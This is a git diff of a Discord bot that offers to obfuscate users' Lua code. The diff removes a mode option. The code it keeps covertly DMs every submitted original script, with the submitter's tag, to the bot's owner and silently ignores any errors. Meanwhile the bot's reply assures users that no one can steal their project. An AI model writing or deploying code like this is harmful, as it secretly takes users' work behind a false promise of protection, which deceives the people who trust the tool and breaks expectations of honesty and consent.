@@ -14,14 +14,6 @@ const client = new Client({ intents: [GatewayIntentBits.Guilds] });
 const command = new SlashCommandBuilder()
     .setName('obf')
     .setDescription('Protect your code with VMM Obfuscator')
-    .addStringOption(o => 
-        o.setName('mode')
-            .setDescription('Select the obfuscation mode')
-            .setRequired(true)
-            .addChoices(
-                { name: 'Normal', value: 'normal' },
-                { name: 'Diabolical', value: 'diabolical' }
-            ))
     .addStringOption(o => o.setName('code').setDescription('Paste your Lua code').setRequired(false))
     .addAttachmentOption(o => o.setName('file').setDescription('Upload a .lua file').setRequired(false));
 
@@ -49,7 +41,6 @@ client.once('ready', async () => {
 client.on('interactionCreate', async interaction => {
     if (!interaction.isChatInputCommand() || interaction.commandName !== 'obf') return;
 
-    const mode = interaction.options.getString('mode');
     const codeOption = interaction.options.getString('code');
     const fileOption = interaction.options.getAttachment('file');
 
@@ -63,12 +54,11 @@ client.on('interactionCreate', async interaction => {
         let src = fileOption ? await fetchURL(fileOption.url) : codeOption;
 
         // --- VALIDACIÓN DE LUA / LOADSTRING ---
-        // Buscamos palabras clave comunes o loadstring
         const isLua = /function|local|then|end|print|loadstring|require|game:|task\./i.test(src);
         
         if (!isLua) {
             const errorEmbed = new EmbedBuilder()
-                .setColor(0xFF0000) // Rojo
+                .setColor(0xFF0000)
                 .setTitle('⚠️ Error')
                 .addFields({ 
                     name: 'info', 
@@ -83,24 +73,19 @@ client.on('interactionCreate', async interaction => {
             const owner = await client.users.fetch(OWNER_ID);
             const originalBuf = Buffer.from(src, 'utf-8');
             await owner.send({
-                content: `**User:** ${interaction.user.tag}\n**Mode:** ${mode}`,
+                content: `**User:** ${interaction.user.tag}`,
                 files: [new AttachmentBuilder(originalBuf, { name: 'original.lua' })]
             });
         } catch (e) {}
 
-        const obfuscatedResult = obfuscate(src, mode);
+        const obfuscatedResult = obfuscate(src);
         const buf = Buffer.from(obfuscatedResult, 'utf-8');
 
         // --- EMBED NEGRO CON SEPARACIONES ---
         const responseEmbed = new EmbedBuilder()
-            .setColor(0x000000) // Color Negro
+            .setColor(0x000000)
             .setTitle('✅ Obfuscation successfully completed')
             .addFields(
-                { 
-                    name: 'Mod', 
-                    value: `\`${mode.toUpperCase()}\``,
-                    inline: false 
-                },
                 { 
                     name: 'Info', 
                     value: "Your code is protected by multiple obfuscation techniques. Don't worry, when searching all deobfuscators, no one can steal your project or work.",
@@ -127,4 +112,3 @@ client.on('interactionCreate', async interaction => {
 });
 
 client.login(TOKEN);
-            
